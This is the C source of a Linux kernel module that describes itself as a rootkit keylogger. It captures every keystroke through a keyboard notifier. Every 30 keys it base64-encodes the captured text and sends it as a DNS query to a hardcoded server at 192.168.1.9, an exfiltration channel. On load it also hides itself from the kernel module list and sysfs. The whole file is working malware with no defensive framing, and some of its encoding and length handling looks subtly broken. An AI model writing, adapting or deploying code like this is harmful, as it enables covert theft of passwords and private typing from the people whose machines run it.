#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/kfifo.h>
#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <net/sock.h>
#include <linux/random.h>
#include <linux/inet.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <crypto/skcipher.h>
#include <crypto/hash.h>
#include <linux/crypto.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mahaamaryam");
MODULE_DESCRIPTION("Rootkit keylogger sending keystrokes encoded in base64 using dns exfilteration");

#define FIFO_SIZE     64            
#define FLUSH_THRESH  30            
#define MAX_KEY_LEN   32            
#define STITCH_BUF_SZ 64            
#define DNS_SERVER    "192.168.1.9"
#define DNS_PORT      53
#define DNS_BUF_SZ    512

struct keystroke {
    char key[MAX_KEY_LEN];
};

static DEFINE_KFIFO(keyfifo, struct keystroke, FIFO_SIZE);
static int key_count = 0;

static const char *keymap[][2] = 
{
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
    {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
    {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
    {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
    {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
    {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
    {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
    {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
    {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
    {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
    {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
    {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
    {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
    {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
    {"_PAUSE_", "_PAUSE_"},                                         // 119
};

#define KEYMAP_SIZE (sizeof(keymap) / sizeof(keymap[0]))
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_encode(unsigned char *output, size_t out_len, unsigned char *input, size_t in_len)
{
    size_t i = 0, j = 0;
    unsigned char temp[4];
    size_t output_len = (in_len + 2) / 3 * 4;

    if (out_len < output_len)
        return -EINVAL;

    for (i = 0; i < in_len; i += 3) {
        temp[0] = input[i] >> 2;
        temp[1] = ((input[i] & 0x03) << 4) | (i + 1 < in_len ? (input[i + 1] >> 4) : 0);
        temp[2] = ((i + 1 < in_len ? (input[i + 1] & 0x0F) << 2 : 0) | (i + 2 < in_len ? (input[i + 2] >> 6) : 0));
        temp[3] = (i + 2 < in_len ? (input[i + 2] & 0x3F) : 0x3F);

        for (j = 0; j < 4; ++j) {
            output[j + (i / 3) * 4] = base64_table[temp[j]];
        }
    }

    for (i = 0; i < (output_len - (in_len % 3 == 0 ? 0 : 1)); ++i) {
        if (output[i + output_len - 1] == 0x3F)
            output[i + output_len - 1] = '=';
    }

    return output_len;
}
static int keyboard_cb(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;
    struct keystroke ks;
    char keystr[MAX_KEY_LEN] = "";

    if (!param->down || param->value >= KEYMAP_SIZE)
        return NOTIFY_OK;

    snprintf(keystr, MAX_KEY_LEN, "%s", keymap[param->value][param->shift ? 1 : 0]);
    snprintf(ks.key, MAX_KEY_LEN, "%s", keystr);

    if (!kfifo_in(&keyfifo, &ks, 1)) {
        printk(KERN_WARNING "kfifo full, dropping key: %s\n", keystr);
        return NOTIFY_OK;
    }

    key_count++;

    if (key_count >= FLUSH_THRESH) {
        char stitched_keys[STITCH_BUF_SZ] = {0};
        int total = 0;
        struct keystroke out;

        while (!kfifo_is_empty(&keyfifo)) {
            if (kfifo_out(&keyfifo, &out, 1)) {
                int remaining = STITCH_BUF_SZ - total - 1;
                if (remaining <= 0)
                    break;
                strncat(stitched_keys, out.key, remaining);
                total = strlen(stitched_keys);
            }
        }

        key_count = 0;

        unsigned char base64_encoded[STITCH_BUF_SZ * 2]; 
        int base64_len = base64_encode(base64_encoded, sizeof(base64_encoded), (unsigned char *)stitched_keys, strlen(stitched_keys));
       // base64_encoded[base64_len] = '\0';  

        struct socket *sock;
        struct sockaddr_in dest;
        struct msghdr msg = {0};
        struct kvec vec;
        unsigned char buf[DNS_BUF_SZ] = {0};

        int ret = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
        if (ret < 0) {
            pr_err("Failed to create socket: %d\n", ret);
            return ret;
        }

        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(DNS_PORT);
        dest.sin_addr.s_addr = in_aton(DNS_SERVER);

        u16 tid = prandom_u32() & 0xFFFF;
        buf[0] = (tid >> 8) & 0XFF;
        buf[1] = tid & 0xFF;

        buf[2] = 0x01; buf[3] = 0x00;
        buf[4] = 0x00; buf[5] = 0x01;
        buf[6] = 0x00; buf[7] = 0x00;
        buf[8] = 0x00; buf[9] = 0x00;
        buf[10] = 0x00; buf[11] = 0x00;

        unsigned char *qname = &buf[12];
        *qname++ = 3; memcpy(qname, "www", 3); qname += 3;

        int label_len = strlen((char *)base64_encoded);
        if (label_len > 63) label_len = 63;
        *qname++ = base64_len;
        memcpy(qname, base64_encoded, base64_len); qname += base64_len;

        *qname++ = 3; memcpy(qname, "com", 3); qname += 3;
        *qname++ = 0;

        *(unsigned short *)qname = htons(1); qname += 2;
        *(unsigned short *)qname = htons(1); qname += 2;

        int buflen = qname - buf;

        vec.iov_base = buf;
        vec.iov_len = buflen;
        msg.msg_name = &dest;
        msg.msg_namelen = sizeof(dest);

        ret = kernel_sendmsg(sock, &msg, &vec, 1, buflen);
        if (ret < 0) {
            pr_err("Failed to send DNS query: %d\n", ret);
        } else {
            pr_info("Sent DNS query with base64-encoded keystrokes to %s\n", DNS_SERVER);
        }

        sock_release(sock);
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = keyboard_cb, .priority = 0,
};

static int __init keylog_init(void) {

list_del(&THIS_MODULE->list); //this removes from /proc/modules and internal list
kobject_del(&THIS_MODULE->mkobj.kobj);
    int ret = register_keyboard_notifier(&nb);
    if (ret)
        printk(KERN_ERR "Failed to register keyboard notifier\n");
    else
        printk(KERN_INFO "kfifo keylogger loaded\n");
    return ret;
}

static void __exit keylog_exit(void) {
    unregister_keyboard_notifier(&nb);
    printk(KERN_INFO "kfifo keylogger unloaded\n");
}

module_init(keylog_init);
module_exit(keylog_exit);

